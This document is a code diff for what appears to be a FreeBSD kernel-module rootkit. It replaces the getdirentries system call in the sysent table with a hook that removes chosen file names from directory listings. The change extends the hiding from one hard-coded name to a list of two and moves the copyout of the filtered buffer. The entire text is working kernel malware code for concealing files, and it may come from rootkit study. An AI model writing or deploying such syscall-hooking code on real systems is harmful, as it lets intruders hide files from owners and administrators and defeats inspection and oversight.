@@ -9,6 +9,10 @@
 #include <sys/sysproto.h>
 #include <sys/dirent.h>
 
+const char hidden_files[2][512] = {
+	"test1.txt", "test2.txt"
+};
+
 /* getdirentries system call hook */
 static int
 getdirentries_hook(struct thread* td, void* syscall_args)
@@ -59,25 +63,28 @@ getdirentries_hook(struct thread* td, void* syscall_args)
 			count -= current->d_reclen;
 
 			/* Check if this is a file we want to hide */
-			if(strcmp(current->d_name, "hello.txt") == 0)
+			for (int i = 0; i < 2; i++)
 			{
-				/* Decrease the size to accomodate for the missing entry */
-				size -= current->d_reclen;
-				td->td_retval[0] = size;
+				if(strcmp(current->d_name, hidden_files[i]) == 0)
+				{
+					/* Decrease the size to accomodate for the missing entry */
+					size -= current->d_reclen;
 
-				/*
-				 * Copy the next entry over this current entry and copy this back
-				 * to the userland buffer
-				 */
-				memmove(current, (unsigned char*)current + current->d_reclen, count);
-				copyout(dp, uap->buf, size);
-				break;
+					/*
+					 * Copy the next entry over this current entry and copy this back
+					 * to the userland buffer
+					 */
+					memmove(current, (unsigned char*)current + current->d_reclen, count);
+					break;
+				}
 			}
 
 			/* If we have not reached the end, set current to the next entry */
 			if (count != 0)
 				current = (struct dirent*)((char*)current + current->d_reclen);
 		}
+		td->td_retval[0] = size;
+		copyout(dp, uap->buf, size);
 		free(dp, M_TEMP);
 	}
 
@@ -93,7 +100,7 @@ load(struct module* module, int cmd, void* arg)
 	switch (cmd)
 	{
 		case MOD_LOAD:
-			/* Replace mkdir with mkdir_hook */
+			/* Replace getdirentries with getdirentries_hook */
 			sysent[SYS_getdirentries].sy_call = (sy_call_t*)getdirentries_hook;
 			break;
 
